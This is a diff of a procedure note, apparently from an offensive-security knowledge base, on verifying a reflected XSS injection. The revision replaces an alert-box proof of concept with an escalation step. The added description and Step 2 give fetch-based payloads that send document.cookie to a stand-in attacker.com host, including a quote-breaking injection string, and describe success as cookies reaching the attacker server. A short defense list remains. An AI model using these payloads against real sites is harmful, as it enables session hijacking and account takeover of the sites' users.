@@ -1,28 +1,29 @@
 ---
-id: proc-uuid-verify-xss
 tags:
-  - xss-verification
-  - exploitation
+  - xss
+  - verification
+  - exfiltration
 type: procedure
 tools: []
 tactics:
-  - '[[Execution]]'
+  - '[[Collection]]'
 commands: []
 verified: false
 platforms:
   - Web
 submitted: true
-created_at: '2023-10-01T00:00:00Z'
+created_at: '2024-10-01T00:00:00Z'
 techniques:
   - '[[JavaScript]]'
-updated_at: '2025-12-14T03:16:08.089Z'
-skill_level: beginner
-impact_level: medium
-detection_risk: low
+updated_at: '2025-12-14T17:28:20.244Z'
+skill_level: intermediate
+impact_level: high
+detection_risk: high
 sub_techniques: []
+id: 1a8072b7-fa34-4d7a-b779-0cdf54b0204a
 validated: true
 mitre_tactics:
-  - '[[Execution]]'
+  - '[[Collection]]'
 mitre_techniques:
   - '[[JavaScript]]'
 ---
@@ -30,55 +31,55 @@ mitre_techniques:
 
 ## Summary
 
-This procedure confirms the success of the XSS injection by observing JavaScript execution, such as an alert dialog, and capturing proof like screenshots.
+This procedure confirms successful XSS injection by observing code execution and evaluating impact, such as altering page behavior or simulating data theft.
 
 ## Description
 
-After submitting the payload to the password field, the reflected input executes in the browser context. Verification involves checking for the alert(1) popup, which indicates arbitrary code execution. This step validates the vulnerability and demonstrates potential for attacks like cookie theft via document.cookie access.
+Upon loading the payload URL, the injected JS executes in the browser context. An alert(0) popup proves control, while source inspection shows modified var t = '/project-chooser!input.jspa'. Escalate by replacing alert with fetch('http://attacker.com?cookie='+document.cookie) for exfiltration, enabling account takeovers via session hijacking.
 
 ## Requirements
 
-1. Submitted payload from previous step
-2. Browser with JavaScript enabled
-3. Ability to capture screenshots
+1. Browser console for logging
+2. Control over an external server for exfiltration testing
+3. Understanding of browser security contexts
 
 ## Defense
 
 Defensive measures and detection strategies:
 
-- Enable strict XSS auditing in browsers and log client-side errors
-- Use Web Application Firewalls (WAF) to block known XSS patterns
-- Regularly test forms with automated scanners like OWASP ZAP
+- Enable XSS Auditor in browsers
+- Implement strict output encoding in JSP/JS
+- Detect via client-side error logs or beaconing to unknown domains
 
 ## Objectives
 
-1. Observe JavaScript alert execution
-2. Inspect reflected payload in page source
-3. Document proof of vulnerability
+1. Confirm arbitrary code execution
+2. Assess real-world impact like data theft
+3. Document for reporting or exploitation
 
 ## Instructions
 
-### Step 1: Observe Client-Side Response
+### Step 1: Load and Observe
 
-**Context**: Monitor the browser for immediate execution upon form processing.
+**Context**: Trigger the page and watch for immediate effects.
 
-Submit the form and watch for popups.
+Visit the encoded URL; expect alert(0) dialog.
 
-> Expected: An alert box with "1" appears, confirming execution.
+> If alert appears, execution confirmed; dismiss and proceed.
 
-### Step 2: Inspect and Capture Proof
+### Step 2: Inspect and Escalate
 
-**Context**: Use developer tools to verify reflection and take evidence.
+**Context**: Verify modifications and test impact.
 
-Open Console (F12) and check for errors or executed scripts. Take a screenshot of the alert.
+Open DevTools > Console; reload page. Check for errors or logs. Modify payload to exfiltrate: ';fetch("http://attacker.com?"+document.cookie);t=' and retest.
 
-> Success if payload is visible in HTML source without escaping, e.g., via View Page Source.
+> Success: Network tab shows request to attacker server with cookies.
 
 ## MITRE ATT&CK Mapping
 
 ### Tactics
 
-- [[Execution]]
+- [[Collection]]
 
 ### Techniques
 
@@ -95,5 +96,5 @@ Open Console (F12) and check for errors or executed scripts. Take a screenshot o
 
 ## Tags
 
-- xss-verification
-- exploitation
+- xss
+- verification
